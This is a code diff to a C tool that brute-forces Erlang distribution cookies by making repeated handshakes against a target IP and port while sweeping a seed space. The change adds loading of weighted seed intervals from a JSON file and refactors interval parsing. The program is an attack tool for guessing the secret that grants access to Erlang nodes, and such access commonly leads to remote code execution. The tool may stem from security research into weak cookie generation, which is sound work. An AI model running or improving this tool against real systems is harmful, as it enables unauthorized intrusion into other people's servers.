@@ -13,9 +13,13 @@
 #include <signal.h>
 #include <sys/queue.h>
 #include <inttypes.h>
+#include <sys/stat.h>
+#include <limits.h>
+#include <math.h>
 #include <assert.h>
 
 #include "erldp.h"
+#include "jsmn.h"
 
 static const char *target;
 static int port;
@@ -30,8 +34,20 @@ struct interval {
 static TAILQ_HEAD(,interval) intervals;
 
 
-static struct interval *parse_interval(char *arg) {
+static struct interval *create_interval(uint64_t start, uint64_t stop,
+  float prob) {
   struct interval *new_interval;
+
+  new_interval = malloc(sizeof(*new_interval));
+  assert(new_interval != NULL);
+  new_interval->start = start;
+  new_interval->stop = stop;
+  new_interval->prob = prob;
+
+  return new_interval;
+}
+
+static struct interval *parse_interval(char *arg) {
   char *comma;
   uint64_t start, stop;
   float prob;
@@ -50,15 +66,9 @@ static struct interval *parse_interval(char *arg) {
   stop = strtoul(arg, NULL, 10);
 
   arg = comma+1;
-  prob = atof(arg);
+  prob = strtof(arg, NULL);
 
-  new_interval = malloc(sizeof(*new_interval));
-  assert(new_interval != NULL);
-  new_interval->start = start;
-  new_interval->stop = stop;
-  new_interval->prob = prob;
-
-  return new_interval;
+  return create_interval(start, stop, prob);
 }
 
 static volatile int quit = 0;
@@ -305,11 +315,80 @@ failed_handshake:
 };
 
 
+static size_t slurp(const char *file, void **pcontent) {
+  int fd;
+  int ret;
+  struct stat properties;
+  size_t size, copied;
+
+  fd = open(file, O_RDONLY);
+  assert(fd != -1);
+
+  ret = fstat(fd, &properties);
+  assert(ret == 0);
+
+  size = properties.st_size;
+
+  *pcontent = malloc(size);
+  assert(*pcontent != NULL);
+
+  for(copied = 0; copied < size;) {
+    ret = read(fd, *pcontent + copied, size - copied);
+    assert(ret > 0);
+    copied += ret;
+  }
+
+  close(fd);
+
+  return size;
+}
+
+static unsigned long jsontoul(const char *json, jsmntok_t *tok) {
+  char buffer[64];
+  char *endptr;
+  unsigned long val;
+
+  assert(tok->end-tok->start+1 <= sizeof(buffer));
+  memset(buffer, 0, sizeof(buffer));
+  memcpy(buffer, json + tok->start, tok->end-tok->start);
+
+  val = strtoul(buffer, &endptr, 10);
+  assert(val != ULONG_MAX);
+
+  return val; 
+}
+
+static float jsontof(const char *json, jsmntok_t *tok) {
+  char buffer[64];
+  char *endptr;
+  float val;
+
+  assert(tok->end-tok->start+1 <= sizeof(buffer));
+  memset(buffer, 0, sizeof(buffer));
+  memcpy(buffer, json + tok->start, tok->end-tok->start);
+
+  val = strtof(buffer, &endptr);
+  assert(val != HUGE_VALF && val != -HUGE_VALF);
+
+  return val;
+}
+
+
+static int jsoneq(const char *json, jsmntok_t *tok, const char *s) {
+  if (tok->type == JSMN_STRING && (int) strlen(s) == tok->end - tok->start &&
+    strncmp(json + tok->start, s, tok->end - tok->start) == 0) {
+    return 0;
+  }
+  return -1;
+}
+
 static void usage(const char *arg0) {
-  fprintf(stderr, "usage: %s [--threads=<1-1024>] [--gap=<gap to sleep between each handshake for a thread, in microsec>] [--interval=<start>,<stop>,<prob> ...] [--seed-full-space] <target IPv4> <target port>\n", arg0);
+  fprintf(stderr, "usage: %s [--threads=<1-1024>] [--gap=<gap to sleep between each handshake for a thread, in microsec>] [--interval=<start>,<stop>,<prob> ...] [--distribution=<json file>] [--seed-full-space] <target IPv4> <target port>\n", arg0);
   fprintf(stderr, "  --threads=<1-1024>: defaults to 64\n");
   fprintf(stderr, "  --gap=<amount of microsec to sleep between each handshake attempt>: defaults to 0, no gap\n");
   fprintf(stderr, "  --interval=<start>,<stop>,<prob>: define a seed interval with the associated probability. It may be used multiple times to define search intervals\n");
+  fprintf(stderr, "  --distribution=<json file>: define a seed distribution. <json file> points a to file containining a JSON array defining interval of the form:\n");
+  fprintf(stderr, "    [{\"start\": 430413359, \"stop\": 431413359, \"prob\": 6.24},...]\n");
   fprintf(stderr, "  --seed-full-space: perform bruteforce over the whole seed space\n");
   exit(1);
 }
@@ -330,6 +409,14 @@ int main(int argc, char **argv) {
   uint64_t delta_fails;
   struct interval *new_interval;
   float cumulative_prob;
+  jsmn_parser p;
+  jsmntok_t tokens[1024];
+  void *content;
+  size_t size;
+  uint64_t start, stop;
+  float prob;
+  struct interval *interval;
+  unsigned n_intervals;
   char full_space[] = "0,68719476735,100.0";
 
   TAILQ_INIT(&intervals);
@@ -339,12 +426,13 @@ int main(int argc, char **argv) {
     {"help", 0, 0, 'h'},
     {"threads", required_argument, 0, 't'},
     {"interval", required_argument, 0, 'i'},
+    {"distribution", required_argument, 0, 'd'},
     {"seed-full-space", 0, 0, 's'},
     {NULL, 0, 0, 0},
   };
 
   while (1) {
-    c = getopt_long(argc, argv, "hst:g:i:", options, &option_index);
+    c = getopt_long(argc, argv, "hst:g:i:d:", options, &option_index);
     if (c == -1) {
       break;
     }
@@ -359,10 +447,56 @@ int main(int argc, char **argv) {
       n_workers = atoi(optarg);
       break;
     case 's':
+      TAILQ_INIT(&intervals);
       new_interval = parse_interval(full_space);
       if (new_interval) {
         TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
       }
+      break;
+    case 'd':
+      TAILQ_INIT(&intervals);
+
+      size = slurp(optarg, &content);
+      if (size <= 0 || content == NULL) {
+        fprintf(stderr, "failed to parse distribution file '%s'\n", optarg);
+        usage(argv[0]);
+      }
+
+      jsmn_init(&p);
+      ret = jsmn_parse(&p, content, size, tokens, sizeof(tokens)/sizeof(tokens[0]));
+      if (ret < 0) {
+        fprintf(stderr, "failed to parse distribution file '%s'\n", optarg);
+        usage(argv[0]);
+      }
+
+      if (ret < 1 || tokens[0].type != JSMN_ARRAY) {
+        fprintf(stderr, "distribution file '%s' shall contain an array\n", optarg);
+        usage(argv[0]);
+      }
+
+      for (i = 1; i < tokens[0].size;) {
+        assert(tokens[i].type == JSMN_OBJECT);
+
+        assert(jsoneq(content, &tokens[i+1], "start") == 0);
+        assert(tokens[i+2].type == JSMN_PRIMITIVE);
+        start = jsontoul(content, &tokens[i+2]);
+
+        assert(jsoneq(content, &tokens[i+3], "stop") == 0);
+        assert(tokens[i+4].type == JSMN_PRIMITIVE);
+        stop = jsontoul(content, &tokens[i+4]);
+
+        assert(jsoneq(content, &tokens[i+5], "prob") == 0);
+        assert(tokens[i+6].type == JSMN_PRIMITIVE);
+        prob = jsontof(content, &tokens[i+6]);
+
+        new_interval = create_interval(start, stop, prob);
+        TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
+
+        i += 7;
+      }
+
+      free(content);
+
       break;
     case 'i':
       new_interval = parse_interval(optarg);
@@ -389,6 +523,14 @@ int main(int argc, char **argv) {
 
   target = argv[optind];
   port = atoi(argv[optind+1]);
+
+
+  n_intervals = 0;
+  TAILQ_FOREACH(interval, &intervals, _next) {
+    n_intervals += 1;
+  }
+
+  printf("Erlang distribution cookie is starting, sweeping through %d seed intervals\n", n_intervals);
 
   workers = calloc(n_workers, sizeof(*workers));
   assert(workers != NULL);
